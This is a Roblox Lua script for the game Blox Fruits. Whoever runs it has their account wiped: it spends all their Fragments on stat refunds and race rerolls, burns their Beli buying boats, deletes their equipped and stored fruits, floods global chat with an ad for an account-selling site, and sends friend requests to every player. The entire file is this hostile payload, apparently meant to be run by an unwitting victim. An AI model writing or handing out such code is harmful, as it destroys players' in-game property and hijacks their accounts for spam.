--==================================== Requisitos - Config ====================================--
local spendfragments = true
local spendbellis = true
local divul = true
local removefruit = true
local addall = true
local TweenService = game:GetService("TweenService")
local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local comm = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
local resetfruit = true
local beliValue
local fragValue

--==================================== Tween Service ====================================--
local function moveTo(targetCFrame, speed)
    speed = speed or 350
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:FindFirstChild("Humanoid")
    local distance = (rootPart.Position - targetCFrame.Position).Magnitude
    local duration = distance / speed
    local tweenInfo = TweenInfo.new(
        duration,
        Enum.EasingStyle.Linear,
        Enum.EasingDirection.Out
    )
    local tween = TweenService:Create(rootPart, tweenInfo, {
        Position = targetCFrame.Position
    })
    local originalCanCollide = rootPart.CanCollide
    rootPart.CanCollide = false
    tween:Play()
    tween.Completed:Wait()
    rootPart.CanCollide = originalCanCollide
end

--==================================== Resetar Stats ====================================--
local function resetstats()
    if not spendfragments then return end
    for _ = 1, 15 do
        task.spawn(function()
            while fragValue and fragValue.Value >= 3000 do
                wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Refund", "2")
            end
        end)
    end
end

--==================================== Reroll Race ====================================--
local function rerollrace()
    if not spendfragments then return end
    for _ = 1, 15 do
        task.spawn(function()
            while fragValue and fragValue.Value >= 3000 do
                wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "Reroll", "2")
            end
        end)
    end
end

--==================================== Spend Bellys ====================================--
local function spendmoney()
    if not spendbellis then return end
    for _ = 1, 1 do
        task.spawn(function()
            while beliValue and beliValue.Value >= 5000 do
                task.wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat","PirateGrandBrigade")
                task.wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat","PirateSloop")
                task.wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat","Guardian")
                task.wait(0.01)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat","PirateBrigade")
            end
        end)
    end
end

--==================================== Divulgação Chat ====================================--
local function advertise()
    if not divul then return end
    if divul then
        while true do     
            wait(0.01)
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("BLOXFRUIS BLACKMARKET COME TO BUY CHEAP ACCOUNTS AT VNROBLOX.COM, I AM THE BEST ROBLOX SUPPLIER IN THE WORLD! HAHAHA", "All")  
        end
    end
end

--==================================== Send Adds ====================================--
local function spamadd()
    if not addall then return end
    if addall then
        while true do
            wait(0.01)
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= game.Players.LocalPlayer then
                    game.Players.LocalPlayer:RequestFriendship(player)
                end
            end
        end
    end
end

--==================================== Remove Fruit ====================================--

local function removeEquippedFruit()
    if not removefruit then return end
    if removefruit then
        print("Removendo frutas...")
        local args = {
            "RemoveFruit",
            "Beli"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    end
end

--==================================== Remote Inventory Fruits ====================================--

local fruits = {
	"Rocket-Rocket", "Spin-Spin", "Blade-Blade", "Spring-Spring", "Bomb-Bomb",
	"Smoke-Smoke", "Spike-Spike", "Flame-Flame", "Eagle-Eagle", "Ice-Ice",
	"Sand-Sand", "Dark-Dark", "Diamond-Diamond", "Light-Light", "Rubber-Rubber",
	"Ghost-Ghost", "Magma-Magma", "Quake-Quake", "Buddha-Buddha", "Love-Love",
	"Spider-Spider", "Creation-Creation", "Sound-Sound", "Phoenix-Phoenix", "Portal-Portal",
	"Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth",
	"T-Rex-T-Rex", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control",
	"Gas-Gas", "Spirit-Spirit", "Yeti-Yeti", "Leopard-Leopard", "Kitsune-Kitsune",
	"Dragon-Dragon"
}
local function removeInvFruits()
    local function removeInvFruit(fruitName)
        local args = { "LoadFruit", fruitName }
        comm:InvokeServer(unpack(args))
    end

    local function resetCharacter()
        player.Character:BreakJoints()
    end

    local function waitForRespawn()
        local char = player.CharacterAdded:Wait()
        repeat wait() until char:FindFirstChild("HumanoidRootPart")
        wait(1)
    end

    local function fruitAppeared(fruit)
        local expectedName = fruit:split("-")[1] .. " Fruit"
        local backpack = player:WaitForChild("Backpack")
        for _, item in pairs(backpack:GetChildren()) do
            if item.Name == expectedName then
                return true
            end
        end
        return false
    end

    task.spawn(function()
        for _, fruit in ipairs(fruits) do
            removeInvFruit(fruit)
            local found = false
            local timeout = 2
            local t = 0
            while t < timeout do
                if fruitAppeared(fruit) then
                    found = true
                    break
                end
                wait(0.2)
                t += 0.2
            end
            if found then
                wait(0.01)
                resetCharacter()
                waitForRespawn()
            else
            end
        end
    end)
end

--==================================== Checker ====================================--
local function checker()
    while true do
        local dataFolder = player:FindFirstChild("Data")
        if dataFolder then
            beliValue = dataFolder:FindFirstChild("Beli")
            fragValue = dataFolder:FindFirstChild("Fragments")
        else
            warn("Data Folder não encontrado.")
        end
        task.wait(0.5)
    end
end

--==================================== Run Script ====================================--
local function start()
    task.spawn(checker)
    task.wait(1)
    task.spawn(spamadd)
    task.spawn(advertise)
    if removefruit then
        task.spawn(removeEquippedFruit)
    end
    if beliValue and beliValue.Value >= 5000 then
        moveTo(CFrame.new(-1929.94, 10.5, -11465.59))
        while beliValue.Value >= 5000 do
            task.wait(0.5)
            spendmoney()
        end
    else
    end
    if fragValue and fragValue.Value >= 3000 then
        while fragValue.Value >= 3000 do
            task.wait(0.5)
            task.spawn(resetstats)
            task.wait(0.5)
            task.spawn(rerollrace)
        end
    else
    end
    if resetfruit then
        task.spawn(removeInvFruits)
    end
end

start()